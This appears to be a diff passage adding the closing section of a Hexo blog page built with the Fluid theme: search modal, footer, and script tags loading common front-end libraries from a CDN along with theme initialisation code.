+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">Search</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">Keyword</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+    </div>
+  
+  
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.4/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.20.1/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/4.3.1/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script  src="/js/local-search.js" ></script>
+
+
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">Blog works best with JavaScript enabled</div>
+  </noscript>
+</body>
+</html>
